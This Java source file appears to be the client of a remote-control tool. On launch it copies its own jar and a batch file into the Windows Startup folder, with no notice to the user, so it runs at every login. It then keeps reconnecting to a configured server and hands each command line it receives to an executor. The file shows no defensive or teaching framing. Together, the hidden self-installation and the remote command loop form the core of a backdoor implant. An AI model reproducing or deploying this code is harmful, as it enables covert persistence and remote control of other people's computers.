package command.entity;

import command.PropertiesConst;
import executor.OtherExecutor;
import handler.Handler;
import thread.ThreadManager;
import util.IOUtil;

import java.io.*;
import java.net.ConnectException;
import java.net.Socket;
import java.util.Date;

class TimeoutRunnable implements Runnable {
    private OtherComputer otherComputer;

    public TimeoutRunnable(OtherComputer otherComputer) {
        this.otherComputer = otherComputer;
    }

    @Override
    public void run() {
        while (true) {
            try {
                Thread.sleep(10000);
                long currentTime = new Date().getTime();
                if (currentTime - otherComputer.getStartTime() >= otherComputer.getTimeOut()) {
                    otherComputer.getMessageSocket().getInputStream().close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

public class OtherComputer extends Computer {
    private String server = PropertiesConst.server;
    private int port = PropertiesConst.port;

    private Socket messageSocket;
    private BufferedReader messageReader;
    private PrintWriter messageWriter;
    private volatile long startTime;
    private long timeOut = 1000 * 60 * 30;

    public static final String currentJarPath = OtherComputer.class.getProtectionDomain().getCodeSource().getLocation().getFile();
    public static final String jarFileName = new File(currentJarPath).getName();
    public static final String batFileName = "startremote.bat";
    public static String userHome = System.getProperty("user.home");
    public static final File parent = new File(userHome+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
    public static final File jarFile = new File(parent,jarFileName);
    public static final File batFile = new File(parent,batFileName);

    public OtherComputer() {
        TimeoutRunnable timeoutRunnable = new TimeoutRunnable(this);
        ThreadManager.getExecutorService().execute(timeoutRunnable);
    }

    public static void main(String[] args) {
        OtherComputer otherComputer = new OtherComputer();
        try {
            otherComputer.createFile();
            otherComputer.start();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void createFile(){
        try {
            //String currentJarPath = "\\D:\\IdeaProjects\\remote\\target\\remote-1.0-SNAPSHOT.jar";
            File currentJarFile = new File(currentJarPath);
            File currentBatFile = new File(currentJarFile.getParent(),batFileName);
            FileInputStream jar = new FileInputStream(currentJarFile);

            if(currentJarFile.exists() && currentJarFile.isFile()){
                if(!jarFile.exists()) {
                    IOUtil.inputToOutput(jar, new FileOutputStream(jarFile));
                }
                if(!batFile.exists() && currentBatFile.exists()){
                    FileInputStream bat = new FileInputStream(currentBatFile);
                    IOUtil.inputToOutput(bat,new FileOutputStream(batFile));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void connect() {
        while (messageSocket == null) {
            try {
                connectServer();
            } catch (ConnectException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void connectServer() throws Exception {
        messageSocket = new Socket(getServer(), getPort());
        messageReader = new BufferedReader(new InputStreamReader(messageSocket.getInputStream()));
        messageWriter = new PrintWriter(new OutputStreamWriter(messageSocket.getOutputStream()));
        String key = getKey();
        sendMessage(Handler.REGISTER +":"+key);
        System.out.println("连接成功");
    }

    public void message() {
        while (true) {
            String command = null;
            boolean success = true;
            try {
                System.out.println("command before");
                startTime = new Date().getTime();
                command = messageReader.readLine();
                System.out.print("command after");
            } catch (IOException e) {
                success = false;
                e.printStackTrace();
            } finally {
                if (command == null || !success) {
                    System.out.println("closed");
                    start();
                } else {
                    OtherExecutor otherExecutor = new OtherExecutor(command, messageWriter);
                    otherExecutor.setKey(getKey());
                    otherExecutor.execute();
                }
            }
        }
    }

    public void start() {
        messageSocket = null;
        connect();
        message();
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public void sendMessage(String message) {
        try {
            System.out.print("message" + message);
            messageWriter.println(message);
            messageWriter.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Socket getMessageSocket() {
        return messageSocket;
    }

    public void setMessageSocket(Socket messageSocket) {
        this.messageSocket = messageSocket;
    }

    public BufferedReader getMessageReader() {
        return messageReader;
    }

    public void setMessageReader(BufferedReader messageReader) {
        this.messageReader = messageReader;
    }

    public PrintWriter getMessageWriter() {
        return messageWriter;
    }

    public void setMessageWriter(PrintWriter messageWriter) {
        this.messageWriter = messageWriter;
    }

    public String getServer() {
        return server;
    }

    public void setServer(String server) {
        this.server = server;
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public long getStartTime() {
        return startTime;
    }

    public void setStartTime(long startTime) {
        this.startTime = startTime;
    }

    public long getTimeOut() {
        return timeOut;
    }

    public void setTimeOut(long timeOut) {
        this.timeOut = timeOut;
    }
}
